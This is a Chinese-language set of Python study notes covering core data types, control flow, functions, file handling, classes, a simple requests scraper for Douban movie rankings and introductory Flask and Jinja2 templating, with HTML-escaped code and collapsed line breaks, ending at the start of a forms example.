元组中的元素值是不允许修改的，但我们可以对元组进行连接组合，例子如下：
tup1 = (12, 34.56)tup2 = (&#x27;abc&#x27;, &#x27;xyz&#x27;)# 以下修改元组元素操作是非法的。# tup1[0] = 100# 创建一个新的元组tup3 = tup1 + tup2print (tup3)

删除元组
元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组
tup = (&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000)del tupprint (&quot;删除后的元组 tup : &quot;)print (tup)

内置函数
函数

所谓元组的不可变指的是元组所指向的内存中的内容不可变
&gt;&gt;&gt; tup = (&#x27;r&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;b&#x27;)&gt;&gt;&gt; tup[0] = &#x27;g&#x27;     # 不支持修改元素Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: &#x27;tuple&#x27; object does not support item assignment&gt;&gt;&gt; id(tup)     # 查看内存地址4440687904&gt;&gt;&gt; tup = (1,2,3)&gt;&gt;&gt; id(tup)4441088800    # 内存地址不一样了

从以上实例可以看出，重新赋值的元组 tup，绑定到新的对象了，不是修改了原来的对象
字典字典是另一种可变容器模型，且可存储任意类型对象。
字典的每个键值 key&#x3D;&gt;value 对用冒号 : 分割，每个对之间用逗号(,)分割，整个字典包括在花括号 {} 中 ,格式如下所示：
d = &#123;key1 : value1, key2 : value2, key3 : value3 &#125;

键必须是唯一的，但值则不必。
值可以取任何数据类型，但键必须是不可变的，如字符串，数字。
创建空字典
使用 &#123;&#125; 创建空字典
# 使用大括号 &#123;&#125; 来创建空字典emptyDict = &#123;&#125;print(emptyDict)print(&quot;Length:&quot;, len(emptyDict)) # 查看字典数量print(type(emptyDict))

也可以使用内建函数 dict() 创建字典：emptydic=dict()
访问字典里面的值
把相对应的键放入方括号中
tinydict = &#123;&#x27;Name&#x27;: &#x27;Runoob&#x27;, &#x27;Age&#x27;: 7, &#x27;Class&#x27;: &#x27;First&#x27;&#125;print (&quot;tinydict[&#x27;Name&#x27;]: &quot;, tinydict[&#x27;Name&#x27;])

修改字典
向字典添加新内容的方法是增加新的键值对，修改或删除已有键值对
显式删除一个字典用del命令
tinydict = &#123;&#x27;Name&#x27;: &#x27;Runoob&#x27;, &#x27;Age&#x27;: 7, &#x27;Class&#x27;: &#x27;First&#x27;&#125;tinydict[&#x27;Age&#x27;] = 8               # 更新 Agetinydict[&#x27;School&#x27;] = &quot;菜鸟教程&quot;  # 添加信息del tinydict[&#x27;Name&#x27;] # 删除键 &#x27;Name&#x27;tinydict.clear()     # 清空字典del tinydict         # 删除字典

注意事项
1.不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住
tinydict = &#123;&#x27;Name&#x27;: &#x27;Runoob&#x27;, &#x27;Age&#x27;: 7, &#x27;Name&#x27;: &#x27;小菜鸟&#x27;&#125;//后面那个会被记住

2.键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行
遍历技巧
在字典中遍历时，关键字和对应的值可以使用 items() 方法同时解读出来：
knights = &#123;&#x27;gallahad&#x27;: &#x27;the pure&#x27;, &#x27;robin&#x27;: &#x27;the brave&#x27;&#125;for k, v in knights.items():    print(k, v)

序列中遍历时，索引位置和对应值可以使用 enumerate() 函数同时得到：
for i, v in enumerate([&#x27;tic&#x27;, &#x27;tac&#x27;, &#x27;toe&#x27;]):	print(i, v)

同时遍历两个或更多的序列，可以使用 zip() 组合：
questions = [&#x27;name&#x27;, &#x27;quest&#x27;, &#x27;favorite color&#x27;]answers = [&#x27;lancelot&#x27;, &#x27;the holy grail&#x27;, &#x27;blue&#x27;]for q, a in zip(questions, answers):    print(&#x27;What is your &#123;0&#125;?  It is &#123;1&#125;.&#x27;.format(q, a))

要反向遍历一个序列，首先指定这个序列，然后调用 reversed() 函数
要按顺序遍历一个序列，使用 sorted() 函数返回一个已排序的序列，并不修改原值：
basket = [&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;apple&#x27;, &#x27;pear&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;]for f in sorted(set(basket)):    print(f)



集合集合（set）是一个无序的不重复元素序列
集合中的元素不会重复，并且可以进行交集、并集、差集等常见的集合操作
可以使用大括号 { } 创建集合，元素之间用逗号 , 分隔， 或者也可以使用 set() 函数创建集合
parame = &#123;value01,value02,...&#125;或者set(value)   比如：set1 = &#123;1, 2, 3, 4&#125;            # 直接使用大括号创建集合set2 = set([4, 5, 6, 7])      # 使用 set() 函数从列表创建集合

注意：创建一个空集合必须用 set() 而不是 **{ }**，因为 { } 是用来创建一个空字典
&gt;&gt;&gt; basket = &#123;&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;apple&#x27;, &#x27;pear&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;&#125;&gt;&gt;&gt; print(basket)                      # 这里演示的是去重功能&#123;&#x27;orange&#x27;, &#x27;banana&#x27;, &#x27;pear&#x27;, &#x27;apple&#x27;&#125;&gt;&gt;&gt; print(&quot;banana&quot; in basket)              # 快速判断元素是否在集合内True&gt;&gt;&gt; print(&#x27;crabgrass&#x27; in basket)False&gt;&gt;&gt; # 下面展示两个集合间的运算....都要再加上一个print&gt;&gt;&gt; a = set(&#x27;abracadabra&#x27;)&gt;&gt;&gt; b = set(&#x27;alacazam&#x27;)&gt;&gt;&gt; a                                  &#123;&#x27;a&#x27;, &#x27;r&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;&#125;&gt;&gt;&gt; a - b                              # 集合a中包含而集合b中不包含的元素&#123;&#x27;r&#x27;, &#x27;d&#x27;, &#x27;b&#x27;&#125;&gt;&gt;&gt; a | b                              # 集合a或b中包含的所有元素&#123;&#x27;a&#x27;, &#x27;c&#x27;, &#x27;r&#x27;, &#x27;d&#x27;, &#x27;b&#x27;, &#x27;m&#x27;, &#x27;z&#x27;, &#x27;l&#x27;&#125;&gt;&gt;&gt; a &amp; b                              # 集合a和b中都包含了的元素&#123;&#x27;a&#x27;, &#x27;c&#x27;&#125;&gt;&gt;&gt; a ^ b                              # 不同时包含于a和b的元素&#123;&#x27;r&#x27;, &#x27;d&#x27;, &#x27;b&#x27;, &#x27;m&#x27;, &#x27;z&#x27;, &#x27;l&#x27;&#125;

添加元素
语法格式：s.add(x) //将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作。
另一种方法：s.update(x) //参数可以是列表，元组，字典等例子如下：
thisset.update(&#123;1,3&#125;)或者 thisset.update([1,4],[5,6])

移除元素
语法格式：s.remove(x) //将元素 x 从集合 s 中移除，如果元素不存在，则会发生错误
另一种方法：s.discard(x) //移除集合中的元素，且如果元素不存在，不会发生错误
s.pop()：随机删除集合中的一个元素

len(s)：计算集合 s 元素个数
s.clear()：清空集合 s
x in s：判断元素 x 是否在集合 s 中，存在返回 True，不存在返回 False
[集合内置方法完整列表](Python3 集合 | 菜鸟教程 (runoob.com))
条件控制语法格式：
if condition_1:    statement_block_1elif condition_2:    statement_block_2else:    statement_block_3


每个条件后面要使用冒号 **:**，表示接下来是满足条件后要执行的语句块。
2、使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。
3、在 Python 中没有 switch…case 语句，但在 Python3.10 版本添加了 match…case，功能也类似

嵌套语句
if 表达式1:    语句    if 表达式2:        语句    elif 表达式3:        语句    else:        语句elif 表达式4:    语句else:    语句

match…case
match subject:    case &lt;pattern_1&gt;:        &lt;action_1&gt;    case &lt;pattern_2&gt;:        &lt;action_2&gt;    case &lt;pattern_3&gt;:        &lt;action_3&gt;    case _:        &lt;action_wildcard&gt;

case _: 类似于 C 和 Java 中的 **default:**，当其他 case 都无法匹配时，匹配这条，保证永远会匹配成功
循环语句while循环：注意冒号和缩进
while 判断条件(condition)：    执行语句(statements)……

可以通过设置条件表达式永远不为 false 来实现无限循环，可以使用 CTRL+C 来退出当前的无限循环。
无限循环在服务器上客户端的实时请求非常有用。
while循环使用else语句
在while的条件为false的条件下else从句才会执行
while &lt;expr&gt;:    &lt;statement(s)&gt;else:    &lt;additional_statement(s)&gt;

下面为斐波那契数列的例子：
a, b = 0, 1while b &lt; 10:    print(b,  end=&#x27;,&#x27;)    c = b    b = a + b    a = c

for循环
for 循环可以遍历任何可迭代对象，如一个列表或者一个字符串；当循环执行完毕后，会执行 else 子句中的代码，如果在循环过程中遇到了 break 语句，则会中断循环，此时不会执行 else 子句。格式如下：
for &lt;variable&gt; in &lt;sequence&gt;:    &lt;statements&gt;else:    &lt;statements&gt;

可以拿来打印单词里的每一个字符
word = &#x27;runoob&#x27;for letter in word:    print(letter)

range函数
需要遍历数字序列，可以使用内置 range() 函数。它会生成数列：for i in range(5)
可以使用 range() 指定区间的值：for i in range(5,9) :print(i)
也可以使 range() 以指定数字开始并指定不同的增量(甚至可以是负数，有时这也叫做’步长’)：for i in range(0, 10, 3) 3为步长
可以使用 range() 函数来创建一个列表：list(range(5))
可以结合 range() 和 len() 函数以遍历一个序列的索引
pass语句
pass是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句，语法如下：
&gt;&gt;&gt;while True:...     pass  # 等待键盘中断 (Ctrl+C)

例子：
for letter in &#x27;Runoob&#x27;:    if letter == &#x27;o&#x27;:      pass      print (&#x27;执行 pass 块&#x27;)   print (&#x27;当前字母 :&#x27;, letter)print (&quot;Good bye!&quot;)

推导式列表推导式
格式如下：
[表达式 for 变量 in 列表] [out_exp_res for out_exp in input_list]或者 [表达式 for 变量 in 列表 if 条件][out_exp_res for out_exp in input_list if condition]


out_exp_res：列表生成元素表达式，可以是有返回值的函数。
for out_exp in input_list：迭代 input_list 将 out_exp 传入到 out_exp_res 表达式中。
if condition：条件语句，可以过滤列表中不符合条件的值

names = [&#x27;Bob&#x27;,&#x27;Tom&#x27;,&#x27;alice&#x27;,&#x27;Jerry&#x27;,&#x27;Wendy&#x27;,&#x27;Smith&#x27;]new_names = [name.upper()for name in names if len(name)&gt;3]print(new_names)//过滤掉长度小于或等于3的字符串列表，并将剩下的转换成大写字母

更复杂一点的例子：
&gt;&gt;&gt; vec1 = [2, 4, 6]&gt;&gt;&gt; vec2 = [4, 3, -9]&gt;&gt;&gt; [x*y for x in vec1 for y in vec2][8, 6, -18, 16, 12, -36, 24, 18, -54]&gt;&gt;&gt; [x+y for x in vec1 for y in vec2][6, 5, -7, 8, 7, -5, 10, 9, -3]&gt;&gt;&gt; [vec1[i]*vec2[i] for i in range(len(vec1))][8, 12, -54]

字典推导式
格式如下：
&#123; key_expr: value_expr for value in collection &#125;或&#123; key_expr: value_expr for value in collection if condition &#125;

例子如下：
dict = &#123;x: x**2 for x in (2,4,6)&#125;//三个数字的平方print(dict)

集合推导式
&#123; expression for item in Sequence &#125;或&#123; expression for item in Sequence if conditional &#125;

例子如下:
a = &#123;x for x in &#x27;abkxjbaugxidyskn&#x27; if x not in &#x27;abcd&#x27;&#125;print(a)print(type(a))

元组推导式（生成器表达式）
元组推导式返回的结果是一个生成器对象
(expression for item in Sequence )或(expression for item in Sequence if conditional )

例子如下：
&gt;&gt;&gt; a = (x for x in range(1,10))&gt;&gt;&gt; a&lt;generator object &lt;genexpr&gt; at 0x7faf6ee20a50&gt;  # 返回的是生成器对象&gt;&gt;&gt; tuple(a)       # 使用 tuple() 函数，可以直接将生成器对象转换成元组(1, 2, 3, 4, 5, 6, 7, 8, 9)

迭代器与生成器迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。
迭代器有两个基本的方法：iter() 和 **next()**。迭代器对象可以使用常规for语句进行遍历
字符串，列表或元组对象都可用于创建迭代器
list=[1,2,3,4]it = iter(list)    # 创建迭代器对象print (next(it))   # 输出迭代器的下一个元素print (next(it))

创造一个迭代器
Python 的构造函数为 init(), 它会在对象初始化的时候执行
把一个类作为一个迭代器使用需要在类中实现两个方法 iter() 与 next() 
iter() 方法返回一个特殊的迭代器对象， 这个迭代器对象实现了 next() 方法并通过 StopIteration 异常标识迭代的完成。
next() 方法会返回下一个迭代器对象
class MyNumbers:  def __iter__(self):    self.a = 1    return self//返回 self，即当前对象本身。这意味着 MyNumbers 类的实例是一个迭代器对象   def __next__(self):    x = self.a    self.a += 1    return x myclass = MyNumbers()myiter = iter(myclass)//使用内置函数 iter() 将 myclass 实例转换为一个迭代器对象，并将其赋值给变量 myiter。通过调用 iter() 函数，会自动调用对象的 __iter__() 方法，因此 myclass 实例将成为一个迭代器对象 print(next(myiter))print(next(myiter))print(next(myiter))print(next(myiter))print(next(myiter))

StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 next() 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代
class MyNumbers:  def __iter__(self):    self.a = 1    return self   def __next__(self):    if self.a &lt;= 20:      x = self.a      self.a += 1      return x    else:      raise StopIteration myclass = MyNumbers()myiter = iter(myclass) for x in myiter:  print(x)

生成器
使用了 yield 的函数被称为生成器（generator）。
yield 是一个关键字，用于定义生成器函数，生成器函数是一种特殊的函数，可以在迭代过程中逐步产生值，而不是一次性返回所有结果。
跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。
当在生成器函数中使用 yield 语句时，函数的执行将会暂停，并将 yield 后面的表达式作为当前迭代的值返回。
然后，每次调用生成器的 next() 方法或使用 for 循环进行迭代时，函数会从上次暂停的地方继续执行，直到再次遇到 yield 语句。这样，生成器函数可以逐步产生值，而不需要一次性计算并返回所有结果。
调用一个生成器函数，返回的是一个迭代器对象
def countdown(n):    while n &gt; 0:        yield n        n -= 1# 创建生成器对象generator = countdown(5)# 通过迭代生成器获取值print(next(generator))  # 输出: 5print(next(generator))  # 输出: 4print(next(generator))  # 输出: 3# 使用 for 循环迭代生成器for value in generator:    print(value)  # 输出: 2 1

函数
函数代码块以 def 关键词开头，后接函数标识符名称和圆括号 **()**。
任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。
函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。
函数内容以冒号 : 起始，并且缩进。
return [表达式] 结束函数，选择性地返回一个值给调用方，不带表达式的 return 相当于返回 None。

def 函数名（参数列表）:    函数体

python 函数的参数传递：

不可变类型：类似 C++ 的值传递，如整数、字符串、元组。如 fun(a)，传递的只是 a 的值，没有影响 a 对象本身。如果在 fun(a) 内部修改 a 的值，则是新生成一个 a 的对象。
def change(a):    print(id(a))   # 指向的是同一个对象    a=10    print(id(a))   # 一个新对象a=1print(id(a))change(a)#地址变了print(a)#这里的地址还是原来的地址

可变类型：类似 C++ 的引用传递，如 列表，字典。如 fun(la)，则是将 la 真正的传过去，修改后 fun 外部的 la 也会受影响


python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象
# 可写函数说明def changeme( mylist ):   &quot;修改传入的列表&quot;   mylist.append([1,2,3,4])   print (&quot;函数内取值: &quot;, mylist)   return# 调用changeme函数mylist = [10,20,30]changeme( mylist )print (&quot;函数外取值: &quot;, mylist)//地址没有变

关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值
def printme( str ):   &quot;打印任何传入的字符串&quot;   print (str)   return printme( str = &quot;菜鸟教程&quot;)

可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，和上述 2 种参数不同，声明时不会命名。基本语法如下：
def functionname([formal_args,] *var_args_tuple ):   &quot;函数_文档字符串&quot;   function_suite   return [expression]

加了星号 ***** 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数
def printinfo( arg1, *vartuple ):   &quot;打印任何传入的参数&quot;   print (&quot;输出: &quot;)   print (arg1)   print (vartuple)printinfo( 70, 60, 50 )

加了两个星号 ** 的参数会以字典的形式导入
def printinfo( arg1, **vardict ):   &quot;打印任何传入的参数&quot;   print (&quot;输出: &quot;)   print (arg1)   print (vardict)printinfo(1, a=2,b=3)

如果单独出现星号 *****，则星号 ***** 后的参数必须用关键字传入
lambda(匿名函数) 使用 lambda 来创建匿名函数。
lambda 函数是一种小型、匿名的、内联函数，它可以具有任意数量的参数，但只能有一个表达式。
匿名函数不需要使用 def 关键字定义完整函数。
lambda 函数通常用于编写简单的、单行的函数，通常在需要函数作为参数传递的情况下使用，例如在 map()、filter()、reduce() 等函数中。
lambda 函数特点：

lambda 函数是匿名的，它们没有函数名称，只能通过赋值给变量或作为参数传递给其他函数来使用。
lambda 函数通常只包含一行代码，这使得它们适用于编写简单的函数。

lambda 语法格式：
lambda arguments: expression


lambda是 Python 的关键字，用于定义 lambda 函数。
arguments 是参数列表，可以包含零个或多个参数，但必须在冒号(:)前指定。
expression 是一个表达式，用于计算并返回函数的结果。

f = lambda: &quot;Hello World!&quot;print(f())

lambda 函数也可以设置多个参数，参数使用逗号 , 隔开
x = lambda a, b : a * bprint(x(5, 6))

通常与内置函数如 map()、filter() 和 reduce() 一起使用，以便在集合上执行操作
numbers = [1, 2, 3, 4, 5]squared = list(map(lambda x: x**2, numbers))print(squared)  # 输出: [1, 4, 9, 16, 25]

File读写文件
open将打开一个文件对象：open(filename, mode)如果该文件无法被打开，会抛出 OSError

filename：包含了你要访问的文件名称的字符串值。
mode：决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读(r)。




模式
描述



r
以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。


rb
以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。


r+
打开一个文件用于读写。文件指针将会放在文件的开头。


rb+
以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。


w
打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


wb
以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


w+
打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


wb+
以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


a
打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。


ab
以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。


a+
打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。


ab+
以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。


文件对象的方法
假设已经创建了一个称为 f 的文件对象,使用下面那些函数都需要先打开一个文件：f = open(&quot;/tmp/foo.txt&quot;, &quot;r&quot;)
f.read()
为了读取一个文件的内容，调用 f.read(size), 这将读取一定数目的数据, 然后作为字符串或字节对象返回。
size 是一个可选的数字类型的参数。 当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回
f.readline()
 会从文件中读取单独的一行。换行符为 ‘\n’。f.readline() 如果返回一个空字符串, 说明已经已经读取到最后一行
f.readlines() 
f.readlines() 将返回该文件中包含的所有行。如果设置可选参数 sizehint, 则读取指定长度的字节, 并且将这些字节按行分割
f.write()
f.write(string) 将 string 写入到文件中, 然后返回写入的字符数
f = open(&quot;/tmp/foo.txt&quot;, &quot;w&quot;)num = f.write( &quot;Python 是一个非常好的语言。\n是的，的确非常好!!\n&quot; )print(num)f.close() #输出结果为29

如果要写入一些不是字符串的东西, 那么将需要先进行转换
f = open(&quot;/tmp/foo1.txt&quot;, &quot;w&quot;)value = (&#x27;www.runoob.com&#x27;, 14)s = str(value)f.write(s)f.close()

f.tell()
f.tell() 用于返回文件当前的读&#x2F;写位置（即文件指针的位置）。文件指针表示从文件开头开始的字节数偏移量。f.tell() 返回一个整数，表示文件指针的当前位置
f.seek()
如果要改变文件指针当前的位置, 可以使用 f.seek(offset, from_what) 函数。
f.seek(offset, whence) 用于移动文件指针到指定位置。
offset 表示相对于 whence 参数的偏移量，from_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾，例如：

seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符
seek(x,1) ： 表示从当前位置往后移动x个字符
seek(-x,2)：表示从文件的结尾往前移动x个字符

from_what 值为默认为0，即文件开头
f.close()
在文本文件中 (那些打开文件的模式下没有 b 的), 只会相对于文件起始位置进行定位。
当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常
当处理一个文件对象时, 使用 with 关键字是非常好的方式。在结束后, 它会帮你正确的关闭文件
&gt;&gt;&gt; with open(&#x27;/tmp/foo.txt&#x27;, &#x27;r&#x27;) as f:...     read_data = f.read()&gt;&gt;&gt; f.closedTrue



异常处理try…except
try 语句按照如下方式工作；

首先，执行 try 子句（在关键字 try 和关键字 except 之间的语句）。
如果没有异常发生，忽略 except 子句，try 子句执行后结束。
如果在执行 try 子句的过程中发生了异常，那么 try 子句余下的部分将被忽略。如果异常的类型和 except 之后的名称相符，那么对应的 except 子句将被执行。
如果一个异常没有与任何的 except 匹配，那么这个异常将会传递给上层的 try 中。

一个 try 语句可能包含多个except子句，分别来处理不同的特定的异常。最多只有一个分支会被执行。
一个except子句可以同时处理多个异常，会被放在一个括号里成为一个元组：except (RuntimeError, TypeError, NameError)
最后一个except子句可以忽略异常的名称，它将被当作通配符使用 except:
try…except…else
语句还有一个可选的 else 子句，该子句必须放在所有的 except 子句之后。else子句将在 try 子句没有发生任何异常的时候执行
try…finally
无论是否发生异常finally 语句都将执行最后的代码，finally语句在else的后面
抛出异常
使用raise语句：raise [Exception [, args [, traceback]]]
x = 10if x &gt; 5:    raise Exception(&#x27;x 不能大于 5。x 的值为: &#123;&#125;&#x27;.format(x))

预定义清理行为
一些对象定义了标准的清理行为，无论系统是否成功的使用了它，一旦不需要它了，那么这个标准的清理行为就会执行
关键词 with 语句就可以保证诸如文件之类的对象在使用完之后一定会正确的执行他的清理方法
with open(&quot;myfile.txt&quot;) as f:    for line in f:        print(line, end=&quot;&quot;)

以上这段代码执行完毕后，就算在处理过程中出问题了，文件 f 总是会关闭
对象类有一个名为 init() 的特殊方法（构造方法），该方法在类实例化时会自动调用
类的方法
在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self, 且为第一个参数，self 代表实例
class people:    name = &#x27;&#x27;    age = 0    #定义私有属性,私有属性在类外部无法直接进行访问    __weight = 0    def __init__(self,n,a,w):        self.name = n        self.age = a        self.__weight = w    def speak(self):        print(&quot;%s 说: 我 %d 岁。&quot; %(self.name,self.age))p = people(&#x27;runoob&#x27;,10,30)p.speak()

类的继承
单继承
class DerivedClassName(BaseClassName):或者 class DerivedClassName(modname.BaseClassName):
class student(people):    grade = &#x27;&#x27;    def __init__(self,n,a,w,g):        #调用父类的构造函数        people.__init__(self,n,a,w)        self.grade = g    #覆写父类的方法    def speak(self):        print(&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;%(self.name,self.age,self.grade))

多继承
多继承的类定义：class DerivedClassName(Base1, Base2, Base3)：

需要注意圆括号中父类的顺序，若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法
类的私有属性
__private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.__private_attrs。
类的私有方法
__private_method：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。self.__private_methods。
命名空间命名空间提供了在项目中避免名字冲突的一种方法。各个命名空间是独立的，没有任何关系的，所以一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。
我们举一个计算机系统中的例子，一个文件夹(目录)中可以包含多个文件夹，每个文件夹中不能有相同的文件名，但不同文件夹中的文件可以重名。
一般有三种命名空间：

内置名称（built-in names）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。
全局名称（global names），模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。
局部名称（local names），函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）

假设我们要使用变量 runoob，则 Python 的查找顺序为：局部的命名空间 -&gt; 全局命名空间 -&gt; 内置命名空间
 global 和 nonlocal 关键字
当内部作用域想修改外部作用域的变量时，就要用到 global 和 nonlocal 关键字了
num = 1def fun1():    global num  # 需要使用 global 关键字声明    print(num)     num = 123    print(num)fun1()print(num)

如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了
def outer():    num = 10    def inner():        nonlocal num   # nonlocal关键字声明        num = 100        print(num)    inner()    print(num)outer()

爬虫requests模块基础的知识可以直接上网搜到，这边就不一一列举了
爬取豆瓣电影的排行榜：
#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport jsonif __name__ == &quot;__main__&quot;:    #1.指定url    post_url = &#x27;https://movie.douban.com/j/chart/top_list&#x27;    #2.进行UA伪装    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&#x27;    &#125;    param = &#123;        &#x27;type&#x27;: &#x27;24&#x27;,        &#x27;interval_id&#x27;: &#x27;100:90&#x27;,        &#x27;action&#x27;: &#x27;&#x27;,        &#x27;start&#x27;: &#x27;0&#x27;,  # 从库中的第几部电影去取        &#x27;limit&#x27;: &#x27;20&#x27;,  # 一次取出的个数    &#125;    response = requests.get(post_url, headers=headers, params=param)    list_data = response.json()    fp = open(&#x27;./douban.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    json.dump(list_data, fp=fp, ensure_ascii=False)    print(&#x27;over!!!&#x27;)&#125;

FlaskHello Worldfrom flask import Flaskapp = Flask(__name__)@app.route(&#x27;/&#x27;)def hello_world():    return &#x27;Hello, World!&#x27;    if __name__ ==&quot;__main__&quot;:    app.run(debug=True,port=8080)


引入Flask类

from flask import Flask

2.创建Flask对象，我们将使用该对象进行应用的配置和运行：
app = Flask(__name__)

name 是Python中的特殊变量，如果文件作为主程序执行，那么__name__变量的值就是__main__，如果是被其他模块引入，那么__name__的值就是模块名称。

编写主程序

在主程序中，执行run()来启动应用：
if __name__ ==&quot;__main__&quot;:    app.run(debug=True, port=8080)

改名启动一个本地服务器，默认情况下其地址是localhost:5000，在上面的代码中，我们使用关键字参数port将监听端口修改为8080。

路由

使用app变量的route()装饰器来告诉Flask框架URL如何触发我们的视图函数：
@app.route(&#x27;/&#x27;)def hello_world():    return &#x27;Hello, World!&#x27;

上面的标识，访问网站的根路径 ‘&#x2F;‘ ，将转为对hello_world()函数的调用。
Flask使用Jinja 2模板先在写代码的目录下面再创一个名为 templates 的文件夹，在其中存放模板文件，以便在应用时使用 Jinja 2 模板引擎渲染动态内容
如果您愿意，您也可以在创建 Flask 应用程序时自定义模板文件夹的名称，具体的做法是在创建应用程序实例时，通过传递 template_folder 参数来指定模板文件夹的路径，例如：
app = Flask(__name__, template_folder=&#x27;my_templates&#x27;)

这样就会将模板文件夹命名为 my_templates，而不是默认的 templates
下面举一个简单的例子：
from flask import Flask, render_templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    # 定义一个变量，在模板中使用    greeting = &#x27;Hello, World!&#x27;    # 渲染模板并传递参数    return render_template(&#x27;index.html&#x27;, greeting=greeting)if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)

，render_template 函数用于渲染名为 index.html 的模板，并且将 greeting 变量传递给模板，以便在模板中使用。
接下来，创建一个名为 index.html 的模板文件:
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Flask Jinja2 Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123; greeting &#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;

使用了双花括号 &#123;&#123; &#125;&#125; 来包含需要在模板中渲染的变量或表达式。在这里，&#123;&#123; greeting &#125;&#125; 就是在 Flask 视图函数中传递的 greeting 变量的值。
运行这个 Flask 应用程序后，当您访问根路径 / 时，将会显示 ‘Hello, World!’ 字样
再来一个比较复杂的使用了 Jinja 2 模板引擎的语法的html代码：
&lt;html&gt;&lt;body&gt;  &#123;% if name %&#125;    &lt;h2&gt;Hello &#123;&#123; name &#125;&#125;.&lt;/h2&gt;  &#123;% else %&#125;    &lt;h2&gt;Hello.&lt;/h2&gt;  &#123;% endif %&#125; &lt;/body&gt;&lt;/html&gt;


&#123;% if name %&#125;`: 这是一个 Jinja 2 的模板标签，用于开始一个条件语句。它表示如果 `name` 变量存在且不为空，则执行下面的代码块
- `&#123;% else %&#125;`: 这是一个 Jinja 2 的模板标签，用于指定条件语句中的“否则”部分。如果条件不满足（即 `name` 不存在或为空），则执行下面的代码块
- `&#123;% endif %&#125;: 这是一个 Jinja 2 的模板标签，用于结束条件语句的部分

表单（实例）先来两个模板文件：收集用户资料和显示用户资料的
第一个为收集用户资料的：
